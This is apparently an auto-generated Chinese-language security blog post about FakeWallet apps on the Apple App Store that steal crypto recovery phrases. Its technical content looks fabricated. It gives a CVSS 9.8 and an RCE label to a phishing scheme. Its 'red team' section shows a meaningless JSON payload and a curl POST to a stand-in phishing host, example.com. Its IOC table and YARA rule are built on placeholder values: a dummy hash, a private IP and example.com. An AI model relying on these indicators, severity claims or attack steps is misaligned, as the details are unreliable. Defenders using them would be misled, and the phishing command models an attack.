---
layout: post
title:  "26 FakeWallet Apps Found on Apple App Store Targeting Crypto Seed Phrases"
date:   2026-04-24 13:07:38 +0000
categories: [security]
severity: critical
---

# 🚨 解析 FakeWallet 攻擊：蘋果應用商店的隱藏危機
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: Malicious Library Injection, Enterprise Provisioning Profiles, Phishing

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: FakeWallet 攻擊的根源在於惡意應用程式可以在蘋果應用商店中發布，並且可以通過企業配置設定檔（Enterprise Provisioning Profiles）來安裝惡意程式碼。
* **攻擊流程圖解**:
  1. 使用者下載並安裝惡意應用程式
  2. 惡意應用程式啟動並重定向到假的蘋果應用商店網頁
  3. 假的蘋果應用商店網頁下載並安裝惡意的錢包應用程式
  4. 惡意的錢包應用程式竊取使用者的恢復短語和私鑰
* **受影響元件**: 蘋果應用商店、iOS 15 及以上版本

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要在蘋果應用商店中下載並安裝惡意應用程式
* **Payload 建構邏輯**:

    ```
    
    python
    # 惡意應用程式的 payload 結構
    {
      "app_id": "com.example.maliciousapp",
      "provisioning_profile": "enterprise_profile",
      "phishing_page": "https://example.com/phishing"
    }
    
    ```
*範例指令*:

```

bash
curl -X POST \
  https://example.com/phishing \
  -H 'Content-Type: application/json' \
  -d '{"app_id": "com.example.maliciousapp", "provisioning_profile": "enterprise_profile"}'

```
* **繞過技術**: 惡意應用程式可以使用企業配置設定檔來繞過蘋果的安全檢查

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /var/mobile/Applications/com.example.maliciousapp |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule FakeWallet {
      meta:
        description = "Detects FakeWallet malware"
      strings:
        $a = "com.example.maliciousapp"
        $b = "enterprise_profile"
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**: 使用者應該避免下載並安裝來自未知來源的應用程式，並且應該保持蘋果應用商店的更新

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Malicious Library Injection**: 惡意程式碼注入，指的是惡意應用程式可以注入其他應用程式的程式碼中，以竊取使用者的資料。
* **Enterprise Provisioning Profiles**: 企業配置設定檔，指的是蘋果公司提供的企業配置設定檔，可以用於配置和管理企業內的 iOS 裝置。
* **Phishing**: 網絡釣魚，指的是惡意攻擊者通過假的網頁或電子郵件來竊取使用者的資料。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/26-fakewallet-apps-found-on-apple-app.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


